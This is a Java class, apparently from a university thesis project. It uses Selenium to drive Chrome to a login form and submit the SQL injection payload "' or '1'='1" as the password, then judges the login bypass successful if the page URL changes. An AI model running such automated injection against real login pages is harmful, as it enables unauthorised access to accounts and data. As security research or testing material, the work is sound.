package de.saarland.thesis.sqlinjection;

import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeDriverService;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.remote.DesiredCapabilities;
import org.openqa.selenium.remote.RemoteWebDriver;

/**
 *
 * @author sireto
 */
public class ChromeSqlInjector implements SqlInjector{

    private WebDriver driver;
    private String url;

    private static ChromeDriverService service;

    public ChromeSqlInjector(String url) {
        System.setProperty("webdriver.chrome.driver", "driver/chromedriver");
        this.driver = new ChromeDriver();
        this.url = url;

        try {
            service = new ChromeDriverService.Builder().
                    usingAnyFreePort().build();
            service.start();
        } catch (IOException ex) {
            Logger.getLogger(ChromeSqlInjector.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void run() {
        try {
            // Start chrome driver service
            service.start();

            // initialize the driver with the url
            driver = new RemoteWebDriver(service.getUrl(), DesiredCapabilities.chrome());

            // get the actual url
            if (this.driver != null) {
                // open page
                this.driver.get(url);

                // find the DOM elements
                WebElement usernameEl = driver.findElement(By.name("username"));
                WebElement passwordEl = driver.findElement(By.name("password"));
                WebElement loginBtnEl = driver.findElement(By.name("login-php-submit-button"));

                // for sql injection
                String username = "user1";
                String password = "' or '1'='1";

                // input username and password to those form fields
                usernameEl.sendKeys(username);
                passwordEl.sendKeys(password);

                // click the login button
                loginBtnEl.click();
            }

        } catch (IOException ioe) {
            Logger.getLogger(ChromeSqlInjector.class.getName()).log(Level.SEVERE, null, ioe);
        }

    }

    @Override
    public void setURL(String url) {
        this.url = url;
    }

    @Override
    public String getURL() {
        return this.url;
    }
    
    @Override
    public boolean isSuccessful(){
        
        if(!driver.getCurrentUrl().equals(this.url)){
            return true;
        }
        return false;
    }
    
}